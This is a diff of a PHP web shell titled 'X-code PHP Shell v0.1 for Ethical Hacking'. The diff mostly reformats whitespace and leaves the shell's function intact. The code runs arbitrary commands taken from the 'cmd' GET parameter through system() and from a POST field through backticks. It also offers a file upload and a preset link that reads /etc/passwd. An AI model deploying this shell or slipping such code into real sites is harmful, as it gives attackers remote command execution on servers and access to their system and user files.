@@ -11,25 +11,24 @@ background-color: #333366;
 
 <body>
 <table width="800" height="342" border="1" align="center" cellpadding="0" cellspacing="0">
-  <tr>
-    <td height="100" align="center" bgcolor="#999999"><div align="center">
-      <p class="style1">X-code PHP Shell v0.1 for Ethical Hacking </p>
-      </div>
-      <p class="style2">Oleh Kurniawan - <a href="http://xcode.or.id" target="_blank">xcode.or.id</a> </p>
-    <p class="style2"><a href="?">Home</a> &#8226; <a href="?shell">Shell</a> &#8226; <a href="?inject">Upload</a> &#8226; <a href="?cmd=uname -a">Cek kernel</a> &#8226; <a href="?cmd=lsb_release -a">Cek Distro linux</a> &#8226; <a href="?cmd=php -v">Cek versi PHP</a> &#8226; <a href="?cmd=lscpu">Cek CPU</a> &#8226;  <a href="?cmd=cat /etc/passwd">Cek User linux</a></p>
-    <p class="style2"><br />
-    </p></td>
-  </tr>
-  <tr>
-    <td height="101" bgcolor="#CCCCCC">
-      <table width="700" border="0" align="center" cellpadding="0" cellspacing="0">
-        <tr>
-          <td>
-		  
-		  <center>
-		    <p>X-code PHP Shell<br />
-	          </p>
-		    <center>	
+<tr>
+<td height="100" align="center" bgcolor="#999999"><div align="center">
+<p class="style1">X-code PHP Shell v0.1 for Ethical Hacking </p>
+</div>
+<p class="style2">Oleh Kurniawan - <a href="http://xcode.or.id" target="_blank">xcode.or.id</a> </p>
+<p class="style2"><a href="?">Home</a> &#8226; <a href="?shell">Shell</a> &#8226; <a href="?inject">Upload</a> &#8226; <a href="?cmd=uname -a">Cek kernel</a> &#8226; <a href="?cmd=lsb_release -a">Cek Distro linux</a> &#8226; <a href="?cmd=php -v">Cek versi PHP</a> &#8226; <a href="?cmd=lscpu">Cek CPU</a> &#8226;  <a href="?cmd=cat /etc/passwd">Cek User linux</a></p>
+<p class="style2"><br />
+</p></td>
+</tr>
+<tr>
+<td height="101" bgcolor="#CCCCCC">
+<table width="700" border="0" align="center" cellpadding="0" cellspacing="0">
+<tr>
+<td>
+<center>
+<p>X-code PHP Shell<br />
+</p>
+<center>	
 <? $cmd = $_GET["cmd"]; if (!empty($cmd)) { echo
 "<pre>"; system($cmd); echo "</pre>"; exit; } ?>
 <?php 
@@ -48,8 +47,6 @@ Nama file : <input type="file" name="file" />
  } 
  }
 ?>
-
-
 <?php 
 if(isset($_GET['shell']))
 { 
@@ -62,11 +59,7 @@ echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <
 <input type="submit" value="Execute">
     </form>';?>
 <pre>
-
-
-
 <? echo `{$_POST['x']};` ?> </pre> <? die(); ?></center>
-
 <?php 
 }
 else
@@ -78,11 +71,9 @@ echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <
  } 
  }
 ?>
-
-
 </center></td>
-        </tr>
-      </table>  </tr>
+</tr>
+</table>  </tr>
 </table>
 </body>
 </html>
